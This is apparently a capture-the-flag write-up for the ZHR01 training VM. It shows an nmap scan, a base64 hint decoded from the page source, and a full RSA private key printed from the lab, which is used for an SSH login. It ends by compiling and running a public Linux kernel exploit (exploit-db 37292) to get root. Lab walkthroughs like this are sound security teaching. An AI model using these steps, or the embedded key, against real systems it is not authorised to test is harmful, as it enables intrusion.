# ZHR01

> This challenge is extraordinary because it’s not from vulnhub. ZHR01 was part of a course on Udemy, which you can check out here: https://www.udemy.com/kali-linux-tutorial-for-beginners/​
> 
> You can download the challenge from here: https://1drv.ms/u/s!Au8ppV18SdSKbag8clXoBLGdOX0

The result of the nmap scan:

```
┌─[root@kali]─[~]
└──╼ # nmap -A 192.168.43.155
Nmap scan report for ZHR01 (192.168.43.155)
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 25:fe:10:ef:eb:5c:7d:ee:69:46:1d:a1:20:4c:31:72 (RSA)
|   256 d1:85:46:de:b7:16:05:bb:6a:10:11:79:65:ca:f4:8e (ECDSA)
|_  256 41:b8:50:96:33:1c:4d:fb:e0:1f:be:7e:ca:6d:29:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to Smooch and Leo's site
MAC Address: 08:00:27:D7:38:53 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE
HOP RTT     ADDRESS
1   0.17 ms ZHR01 (192.168.43.155)
```

There was only two services running, so let’s check the web server first. I viewed the source of the "About Smooch" page since the cat likes to hide things.

```html
<html class="gr__192_168_43_155">
 <head>
  <title>Smooch's Site</title>
 </head>
 <body data-gr-c-s-loaded="true">
  <h1 style="text-align: center;">Smooch</h1>
  <p style="text-align: center;">
   <span style="color: #000000;">
    <img src="/images/smooch.jpg" 
    alt="I have hidden something for you ;-)">&nbsp;
   </span>
  </p>
 <p style="text-align: center;">
   This is Smooch, she is Leo's step mother.
   She raised him like her own son. She really loves to hide things.        
    <br>Maybe she was hinding something for you too... ;-)
 </p>
 <p style="text-align: center;">
  <span style="color: #000000;">
   <strong>
    <a style="color: #000000; text-decoration: underline;" 
      href="index.html">&lt; Back</a>
   </strong>
  </span>
 </p>
 <!-- Y2hlY2sgb3V0IHNtb29jaF9zZWNyZXQudHh0 -->
 </body>
   <span class="gr__tooltip">
    <span class="gr__tooltip-content"></span>
    <i class="gr__tooltip-logo"></i>
    <span class="gr__triangle"></span>
   </span>
</html>
```

The comment was a base64 encoded text, which was:

```
echo Y2hlY2sgb3V0IHNtb29jaF9zZWNyZXQudHh0 | base64 -d
check out smooch_secret.txt
```

It was again a base64 encoded text file, which contained a private RSA key:

```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

## Using the SSH key

I needed to change the permissions of the file.

```
┌─[root@kali]─[~/Downloads]
└──╼ # chmod 600 private_key
```

First, I tried root and smooch as the username, but eventually, I found out the correct username is `sm00ch`, who published the articles on the site.

```
┌─[root@kali]─[~/Downloads]
└──╼ # ssh -i private_key sm00ch@192.168.43.155
Welcome to Ubuntu 14.10 (GNU/Linux 3.16.0-23-generic i686)* Documentation:  https://help.ubuntu.com/System information as of Mon Sep  3 00:23:58 CEST 2018System load:  0.0               Processes:           72
  Usage of /:   58.0% of 1.91GB   Users logged in:     0
  Memory usage: 5%                IP address for eth0: 192.168.43.155
  Swap usage:   0%Graph this data and manage this system at:
    https://landscape.canonical.com/Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflifeNew release '15.04' available.
Run 'do-release-upgrade' to upgrade to it.sm00ch@ZHR01:~$
```

The goal of this challenge is to get root, but for that, I needed to escalate my privileges.

```
sm00ch@ZHR01:~$ whoami
sm00ch
sm00ch@ZHR01:~$ uname -a
Linux ZHR01 3.16.0-23-generic #31-Ubuntu 2014 i686 i686 i686
sm00ch@ZHR01:~$ cat /etc/issue
Ubuntu 14.10 \n \l
```

I quickly found the correct kernel exploit for the job. Here: https://www.exploit-db.com/exploits/37292/

```
sm00ch@ZHR01:/tmp$ gcc 37292.c -o exploit
sm00ch@ZHR01:/tmp$ ./exploit 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root​
```

I got root and with this, I consider the challenge finished.
